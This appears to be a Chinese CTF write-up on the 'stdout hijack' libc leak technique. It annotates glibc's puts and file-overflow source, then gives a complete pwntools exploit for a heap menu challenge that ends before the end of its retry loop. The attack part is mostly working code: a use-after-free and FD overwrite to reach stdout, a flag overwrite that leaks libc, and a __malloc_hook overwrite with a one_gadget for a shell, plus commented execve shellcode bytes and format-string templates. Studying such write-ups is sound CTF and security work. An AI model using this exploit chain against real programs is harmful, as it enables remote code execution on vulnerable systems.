    _IO_puts (const char *str)
    {
      int result = EOF;
      _IO_size_t len = strlen (str);
      _IO_acquire_lock (_IO_stdout);
      if ((_IO_vtable_offset (_IO_stdout) != 0
           || _IO_fwide (_IO_stdout, -1) == -1)
          && _IO_sputn (_IO_stdout, str, len) == len
          && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
        result = MIN (INT_MAX, len + 1);
      _IO_release_lock (_IO_stdout);
      return result;
    }
_IO_new_file_overflow源码分析：
    int
    _IO_new_file_overflow (_IO_FILE *f, int ch)
    {
      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
        {
          f->_flags |= _IO_ERR_SEEN;
          __set_errno (EBADF);
          return EOF;//程序会dang，所以我们不能进入这个if分支，所以f->_flags & _IO_NO_WRITES要等于0，所以flag=0xfbad0000
        }
      /* If currently reading or no buffer allocated. */
      if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
        ......
        ......
          //这个分支复杂，最后也会dang，我们不能进去，所以f->_flags & _IO_CURRENTLY_PUTTING=1即可，所以flag=0xfbad0800
        }
      if (ch == EOF)
        return _IO_do_write (f, f->_IO_write_base,
                 f->_IO_write_ptr - f->_IO_write_base); //目标函数，这里执行_IO_do_write会涉及到syscall，相当于write(1,buf,size),由于目的就是泄露地址，所以buf=_IO_write_base就是我们要修改的值，一般将末尾改成'\x00'，原本是有值的
      if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
        if (_IO_do_flush (f) == EOF)
          return EOF;
      *f->_IO_write_ptr++ = ch;
      if ((f->_flags & _IO_UNBUFFERED)
          || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
        if (_IO_do_write (f, f->_IO_write_base,
                  f->_IO_write_ptr - f->_IO_write_base) == EOF)
          return EOF;
      return (unsigned char) ch;
    }
进去do_new_write:
    static
    _IO_size_t
    new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
    {//相当于write(1，buf，size)
      _IO_size_t count;
      if (fp->_flags & _IO_IS_APPENDING)//要进去的话，flag=0xfbad1800
        fp->_offset = _IO_pos_BAD;
      else if (fp->_IO_read_end != fp->_IO_write_base)
        {//这里虽然可以改，但是如果改成相同的，程序会crash掉，所以要避免进去这个分支
          _IO_off64_t new_pos
        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
          if (new_pos == _IO_pos_BAD)
        return 0;
          fp->_offset = new_pos;
        }
      count = _IO_SYSWRITE (fp, data, to_do);   //最终输出，系统调用write
      if (fp->_cur_column && count)
        fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
      _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
      fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
      fp->_IO_write_end = (fp->_mode _flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
                   ? fp->_IO_buf_base : fp->_IO_buf_end);
      return count;//回显出write出来的东西
    }
好了，源码解析完毕了，下面就是利用演示了：
这种利用方法针对于没有puts打印函数的情况，但是需要一个前提，就是需要劫持到stdout结构体，一般来说是通过UAF(unsorted
bin切割法得到地址，FD指向unsortedbin)，接着改FD的main_arena+88的末位（若没有则利用攻击global_max_fast的方式去做，使得有fastbin
dump），变成stdout-xx的位置(得有0x7f或者0xff的size，0x7f在0x43的位置，0xff在0x51的位置)，下一次申请时就可以从上往下写，改写flag标志位为0xfbad1800固定值，同时修改IO_Write_base末尾为'\x00'，在flag位和IO_Write_base位之间填写的东西可以为任意值，我们的目的是下溢改写IO_Write_base。
程序就是常规的菜单题：
我们整理出函数，没有puts打印函数，但是有UAF漏洞，可以free完改FD，也可以double free。
    def malloc(index,size):
        ru("Your choice: ")
        sl('1')
        ru("Index: ")
        sl(str(index))
        ru("Size: ")
        sl(str(size))
    def free(index):
        ru("Your choice: ")
        sl('3')
        ru("Index: ")
        sl(str(index))
    def edit(index,size,content):
        ru("Your choice: ")
        sl('4')
        ru("Index: ")
        sl(str(index))
        ru("Size: ")
        sl(str(size))
        ru("Content: ")
        sd(content)
这里有个问题就是搞到有unsorted_bin的FD指针的堆块，重复利用法：
    malloc(0,0x400)
    malloc(1,0x60)
    malloc(2,0x20)
    free(0)
    malloc(3,0x60)
    malloc(4,0x60)
    malloc(5,0x60)
    free(3)
    free(4)
    edit(4,1,'\xe0')
先申请大块chunk，free用切割法得到有main_arena地址的chunk块，然后利用UAF改写FD指针指向我们的有main_arena地址的堆块，接着再edit这个堆块的FD为stdout-xx(成功实现劫持)，所以这个块是被使用了两次~
再申请出来就可以改写stdout的标志位和输出位置了。有了真实地址后就可以再次改写FD指针然后改malloc_hook为我们的onegadget，即可getshell。
    #coding=utf8
    from pwn import *
    from libformatstr import FormatStr
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./fkroman')
    if local:
        p = process('./fkroman')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
    #onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
    # payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
    # f = FormatStr(isx64=1)
    # f[0x8048260]=0x45372800
    # f[0x8048260+4]=0x7f20
    # f.payload(7)
    #shellcode = asm(shellcraft.sh())
    #shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
    #shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
    #shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def malloc(index,size):
        ru("Your choice: ")
        sl('1')
        ru("Index: ")
        sl(str(index))
        ru("Size: ")
        sl(str(size))
    def free(index):
        ru("Your choice: ")
        sl('3')
        ru("Index: ")
        sl(str(index))
    def edit(index,size,content):
        ru("Your choice: ")
        sl('4')
        ru("Index: ")
        sl(str(index))
        ru("Size: ")
        sl(str(size))
        ru("Content: ")
        sd(content)
    def pwn():
        malloc(0,0x400)
        malloc(1,0x60)
        malloc(2,0x20)
        free(0)
        malloc(3,0x60)
        malloc(4,0x60)
        malloc(5,0x60)
        free(3)
        free(4)
        edit(4,1,'\xe0')
        malloc(3,0x60)
        edit(5,2,'\xdd\x75')
        # debug(0)
        malloc(4,0x60)
        py = ''
        py += '\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00'
        malloc(5,0x60)
        edit(5,len(py),py)
        rc(0x40)
        libc_base = u64(rc(8)) - 0x3c5600
        print "libc_base--->" + hex(libc_base)
        onegadget = libc_base + 0x4526a
        fake_chunk = libc_base + libc.symbols["__malloc_hook"] - 0x23
        free(1)
        edit(1,8,p64(fake_chunk))
        malloc(1,0x60)
        malloc(6,0x60)
        py = ''
        py += 'a'*0x13 + p64(onegadget)
        edit(6,len(py),py)
        malloc(7,0x60)
    i = 1
    while 1:
        print i
        i += 1
        try:
            pwn()
        except Exception as e: